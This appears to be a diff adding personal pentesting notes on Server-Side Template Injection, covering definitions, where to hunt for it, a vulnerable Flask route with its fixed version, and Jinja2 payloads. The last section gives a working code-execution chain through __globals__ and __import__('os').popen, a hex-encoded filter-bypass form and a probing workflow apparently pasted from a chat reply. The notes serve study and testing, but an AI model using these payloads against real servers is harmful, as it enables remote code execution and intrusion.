@@ -1,0 +1,145 @@
+## what is SSTI
+
+
+	├── Definition
+	│   ├── Server-Side Template Injection occurs when user input is injected into a template engine
+	│   ├── Template engines render dynamic HTML or content using templates
+	│   ├── Vulnerable apps pass untrusted input to template engine
+	│   ├── No proper sanitization or escaping of input
+	│   └── Can lead to code execution if template engine allows it
+	├── Impact
+	│   ├── Execution of arbitrary template expressions
+	│   ├── Arbitrary code execution (Python, PHP, Ruby, etc.)
+	│   ├── Read sensitive files (config files, credentials)
+	│   ├── Modify internal server state
+	│   ├── Remote shell if engine supports OS interaction
+	│   ├── Leak environment variables
+	│   └── Pivot to other attacks (DB access, RCE)
+	├── Common Template Engines
+	│   ├── Jinja2 (Python)
+	│   ├── Twig (PHP)
+	│   ├── Freemarker (Java)
+	│   ├── Velocity (Java)
+	│   ├── Django Templates (Python)
+	│   └── Liquid (Ruby)
+	├── Types of SSTI
+	│   ├── Expression Injection: {{user_input}}
+	│   ├── Statement Injection: {% code %} in Jinja/Twig
+	│   ├── Variable Access: access internal objects
+	│   └── Function Execution: call built-in functions from input
+	└── Prerequisites
+	    ├── Application uses server-side templates
+	    ├── User input reflected in template
+	    ├── No proper escaping/filtering
+	    ├── Engine supports dynamic code evaluation
+	    └── Knowledge of template engine syntax increases success
+
+
+
+
+## where to find ssti
+
+	SSTI Hunting
+	├── Input Reflection Points
+	│   ├── User profile pages (name, bio, description)
+	│   ├── Feedback / comments
+	│   ├── Message boards / forums
+	│   └── Contact forms / support pages
+	├── Dynamic Content Pages
+	│   ├── Search endpoints
+	│   ├── PDF generators / report generation
+	│   ├── Email templates (welcome, notification)
+	│   └── Admin dashboards
+	├── Template Engine Clues
+	│   ├── Jinja2: {{ }}, {% %}, {{7*7}}
+	│   ├── Twig: {{ }}, {% %}, {{7*7}}
+	│   ├── Freemarker: ${}, <#...>
+	│   ├── Django: {{ }}, {% %}, {{7*7}}
+	│   └── Liquid: {{ }}, {% %}, {{7*7}}
+	├── API Endpoints
+	│   ├── JSON endpoints reflecting input
+	│   ├── XML endpoints
+	│   └── HTTP headers reflected in response
+	├── Third-Party Plugins
+	│   └── CMS plugins rendering templates from input
+	└── Old / Legacy Pages
+	    ├── Report generators
+	    ├── Upload / convert scripts
+	    ├── Admin-only pages
+	    └── Deprecated endpoints
+
+
+## source code (before&after)
+	
+	# app_vuln.py
+	from flask import Flask, request, render_template_string
+	app = Flask(__name__)
+	
+	@app.route('/preview', methods=['POST'])
+	def preview():
+	    # user supplies full template body
+	    tpl = request.form.get('template')     # DANGER: user-controlled template
+	    return render_template_string(tpl) # RENDERING USER INPUT DIRECTLY ->SSTI
+
+
+	------after-------
+	
+		# app_fixed_whitelist.py
+	from flask import Flask, request, render_template
+	import html
+	
+	app = Flask(__name__)
+	
+	\# server-managed template file (templates/email.html)
+	# content example: "Hello {{ username }}, your order {{ order_id }} isready."
+	
+	@app.route('/preview_safe', methods=['POST'])
+	def preview_safe():
+	    # Accept only simple token values from user, never templates
+	    username = request.form.get('username', 'Guest')
+	    order_id = request.form.get('order_id', 'N/A')
+	
+	    # escape values to avoid HTML injection
+	    safe_username = html.escape(username)
+	    safe_order_id = html.escape(order_id)
+	
+	    # render server-side template file with safe variables only
+	    return render_template('email.html', username=safe_username, 
+	    order_id=safe_order_id)
+
+
+# payload & bypass
+
+	the flow: object / dict / module / callable
+	
+ - {{ (request is defined) and request.method }} in janja2 to know is request i exist 
+
+- bypass: 
+	encode . dot also encode __   (with hex to template  engine render it)
+	
+		payload: request.application.__globals__['__builtins__']['__import__']
+		('os').popen('ls').read()
+
+		with encode: 
+		{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
+	 
+ 
+
+
+	ere’s the same **safe, step‑by‑step SSTI probing workflow** translated to English — short, actionable, and ready to paste into a template to run in your lab.
+	
+	1. `{{ (request is defined) }}` → Is `request` present? (True / False)
+	    
+	2. `{{ request|attr('application')|default('NO') }}` → Is `application` available on `request`?
+	    
+	3. `{{ request|attr('application')|attr('__class__').__name__|default('NO') }}` → What is the `application`’s class name?
+	    
+	4. `{{ request|attr('application')|attr('__globals__')|default('NO') }}` → Are `__globals__` visible? (returns `NO` if not)
+	    
+	5. If visible: `{{ request|attr('application')|attr('__globals__').keys()|list[:20] }}` → List the keys in `__globals__` (first 20).
+	    
+	6. If there is `__builtins__`: `{{ request|attr('application')|attr('__globals__')['__builtins__']|default('NO') }}` → Check its type (dict or module).
+	    
+	7. Then test `__import__` safely (obfuscate names if needed). Prefer non-destructive calls, e.g.:  
+	    `{{ request|attr('application')|attr('__globals__')['__built' + 'ins__']['__im' + 'port__']('os').getcwd() }}`  
+	    or `{{ request|attr('application')|attr('__globals__')['__builtins__'].__import__('os').getcwd() }}` depending on type
